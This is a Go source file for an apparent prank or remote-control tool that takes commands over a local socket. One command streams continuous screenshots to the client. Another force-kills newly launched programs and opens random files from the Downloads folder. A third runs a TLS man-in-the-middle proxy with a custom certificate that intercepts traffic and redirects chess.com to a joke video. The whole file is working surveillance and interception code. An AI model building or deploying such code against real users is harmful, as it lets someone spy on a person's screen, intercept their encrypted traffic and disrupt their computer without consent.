package main

import (
	"bufio"
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"github.com/AdguardTeam/gomitmproxy"
	"github.com/AdguardTeam/gomitmproxy/mitm"
	"github.com/AdguardTeam/gomitmproxy/proxyutil"
	"github.com/mitchellh/go-ps"
	"github.com/vova616/screenshot"
	"image/jpeg"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"
)

// for redirect
type CustomCertsStorage struct {
	// certsCache is a cache with the generated certificates.
	certsCache map[string]*tls.Certificate
}

func (c *CustomCertsStorage) Get(key string) (cert *tls.Certificate, ok bool) {
	cert, ok = c.certsCache[key]

	return cert, ok
}

// Set saves the certificate to the storage.
func (c *CustomCertsStorage) Set(key string, cert *tls.Certificate) {
	c.certsCache[key] = cert
}

var runningClose = false
var runningRedirect = false

func sendImages(conn net.Conn) {
	for {
		img, err := screenshot.CaptureScreen()
		if err != nil {
			log.Println(err)
			continue
		}
		buf := new(bytes.Buffer)
		err = jpeg.Encode(buf, img, nil)
		if err != nil {
			log.Println(err)
			continue
		}
		encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
		_, err = conn.Write([]byte(encoded))
		if err != nil {
			log.Println(err)
			return
		}
		time.Sleep(time.Millisecond)
	}
}

func closeNewProcesses(stopClose chan bool) {
	programOpened := map[int]bool{}
	importantProcesses := map[string]bool{
		"explorer.exe":                true,
		"powershell.exe":              true,
		"svchost.exe":                 true,
		"wininit.exe":                 true,
		"winlogon.exe":                true,
		"lsass.exe":                   true,
		"services.exe":                true,
		"csrss.exe":                   true,
		"smss.exe":                    true,
		"System":                      true,
		"Registry":                    true,
		"System Idle":                 true,
		"System Interrupts":           true,
		"System Task":                 true,
		"goland64.exe":                true,
		"gofmt.exe":                   true,
		"git.exe":                     true,
		"taskkill.exe":                true,
		"conhost.exe":                 true,
		"dllhost.exe":                 true,
		"cmd.exe":                     true,
		"OpenWith.exe":                true,
		"consent.exe":                 true,
		"msiexec.exe":                 true,
		"SearchProtocolHost.exe":      true,
		"mchost.exe":                  true,
		"RuntimeBroker.exe":           true,
		"ApplicationFrameHost.exe":    true,
		"ShellExperienceHost.exe":     true,
		"StartMenuExperienceHost.exe": true,
		"backgroundTaskHost.exe":      true,
		"smartscreen.exe":             true,
		"WmiPrvSE.exe":                true,
		"runnerw.exe":                 true,
	}
	homeDir, err := os.UserHomeDir()
	if err != nil {
		panic(err)
	}

	downloadsDir := filepath.Join(homeDir, "Downloads")

	fmt.Println(downloadsDir)

	files, err := ioutil.ReadDir(downloadsDir)
	if err != nil {
		fmt.Println("Error reading directory:", err)
		return
	}
	// Get a list of all processes running on the system
	processes, err := ps.Processes()
	if err != nil {
		fmt.Println("Error getting processes: ", err)
		return
	}

	// Loop continuously to detect new processes
	for {
		select {
		case <-stopClose:
			// Stop the loop when the stop channel receives a signal
			fmt.Println("Closing function stopped")
			return
		default:
			newProcesses, err := ps.Processes()
			if err != nil {
				fmt.Println("Error getting new processes: ", err)
				continue
			}

			// Compare the current list of processes with the new list
			for _, newProcess := range newProcesses {
				found := false
				for _, process := range processes {
					if newProcess.Pid() == process.Pid() {
						found = true
						break
					}
				}

				// If the process is not in the current list, it's new
				if !found {
					//fmt.Printf("New process detected: %dmd\t%s\n", newProcess.Pid(), newProcess.Executable())
					if !importantProcesses[newProcess.Executable()] && !programOpened[newProcess.Pid()] {
						go func() {
							kill := exec.Command("TASKKILL", "/T", "/F", "/IM", newProcess.Executable())
							//fmt.Println("TASKKILL", "/T", "/F", "/IM", newProcess.Executable(), newProcess.Pid())
							kill.Stderr = os.Stderr
							kill.Stdout = os.Stdout
							err := kill.Run()
							if err != nil {
								fmt.Println("kill error", newProcess.Executable(), err)
							}
							if err == nil {
								fmt.Println("killed: ", newProcess.Executable(), " ", newProcess.Pid())
								if len(files) == 0 {
									fmt.Println("No files found in Downloads directory")
									return
								}
								randomIndex := rand.Intn(len(files))
								randomFile := files[randomIndex]

								// Open the file.
								filePath := filepath.Join(downloadsDir, randomFile.Name())
								// open the file using the default program associated with it
								cmd := exec.Command("cmd", "/c", "start", filePath)
								err = cmd.Run()
								if err != nil {
									fmt.Println("Error opening file:", err)
									return
								}

								// Get the process ID of the program that opened the file.
								pid := cmd.Process.Pid
								fmt.Println(pid, " ", cmd.Process, " ", newProcess.Executable(), " ", newProcess.Pid())
								programOpened[pid] = true
							}

						}()
					} else {
						//fmt.Println("Process is important and will not be terminated.:", newProcess.Executable())
					}
				}
			}

			// Update the current list of processes
			processes = newProcesses

			// Sleep for a short interval before checking for new processes again
			time.Sleep(5 * time.Millisecond)
		}

	}
}

func redirect(stopRedirect chan bool) {
	// Read the MITM cert and key.
	tlsCert, err := tls.LoadX509KeyPair("demo.crt", "demo.key")
	privateKey := tlsCert.PrivateKey.(*rsa.PrivateKey)

	x509c, err := x509.ParseCertificate(tlsCert.Certificate[0])
	if err != nil {
		log.Fatal(err)
	}

	mitmConfig, err := mitm.NewConfig(x509c, privateKey, &CustomCertsStorage{
		certsCache: map[string]*tls.Certificate{}},
	)

	if err != nil {
		log.Fatal(err)
	}

	// Generate certs valid for 7 days.
	mitmConfig.SetValidity(time.Hour * 24 * 7)
	// Set certs organization.
	mitmConfig.SetOrganization("gomitmproxy")

	proxy := gomitmproxy.NewProxy(gomitmproxy.Config{
		ListenAddr: &net.TCPAddr{
			IP:   net.IPv4(0, 0, 0, 0),
			Port: 8080,
		},
		MITMConfig: mitmConfig,
		OnRequest: func(session *gomitmproxy.Session) (request *http.Request, response *http.Response) {
			req := session.Request()

			log.Printf("onRequest: %s %s", req.Method, req.URL.String())
			fmt.Println(req.URL.Host)
			if req.URL.Host == "www.chess.com" {
				session.SetProp("blocked", true)
			}
			return nil, nil
		},
		OnResponse: func(session *gomitmproxy.Session) *http.Response {
			log.Printf("onResponse: %s", session.Request().URL.String())

			if _, ok := session.GetProp("blocked"); ok {
				log.Printf("onResponse: was blocked")
				redirectURL := "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
				resp, err := http.Get(redirectURL)
				if err != nil {
					log.Fatal(err)
				}
				res := proxyutil.NewResponse(http.StatusFound, resp.Body, nil)
				res.Header.Set("Content-Type", "text/html")
				res.Header.Set("Location", redirectURL)
				return res
			}

			return session.Response()
		},
	})

	fmt.Println("hi")
	select {
	case <-stopRedirect:
		fmt.Println("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
		signalChannel := make(chan os.Signal, 1)
		signal.Notify(signalChannel, syscall.SIGINT, syscall.SIGTERM)
		<-signalChannel

		// Clean up
		proxy.Close()
		// Stop the loop when the stop channel receives a signal
		fmt.Println("Redirect function stopped")
		return
	default:

	}

}

func stopClosing(stopClose chan bool) {
	// Send a signal to the stop channel to stop the closing function
	stopClose <- true
	runningClose = false
}

func stopRedirecting(stopRedirect chan bool) {
	// Send a signal to the stop channel to stop the redirect function
	stopRedirect <- true
	runningRedirect = false
}

func main() {
	// Start listening on port 9090
	listener, err := net.Listen("tcp", "localhost:9090")
	if err != nil {
		panic(err)
	}
	defer listener.Close()

	// Create a stop channel
	stopClose := make(chan bool)
	stopRedirect := make(chan bool)

	// Loop forever and handle incoming connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			panic(err)
		}
		go handleConnection(conn, stopClose, stopRedirect)
	}
}

func handleConnection(conn net.Conn, stopClose chan bool, stopRedirect chan bool) {
	defer conn.Close()

	// Create a map of commands to functions
	commands := map[string]func(){
		"closing": func() {
			if !runningClose {
				runningClose = true
				go closeNewProcesses(stopClose)
			} else {
				fmt.Println("Function X is already running")
			}
		},
		"redirect": func() {
			if !runningRedirect {
				runningRedirect = true
				go redirect(stopRedirect)
			} else {
				fmt.Println("Function Y is already running")
			}
		},
		"screen": func() {
			go sendImages(conn)
		},
		"stopClosing":  func() { stopClosing(stopClose) },
		"stopRedirect": func() { stopRedirecting(stopRedirect) },
	}

	// Read commands from the client and execute the corresponding function
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()
		if function, ok := commands[command]; ok {
			function()
		} else {
			fmt.Println("Unknown command:", command)
		}
	}
}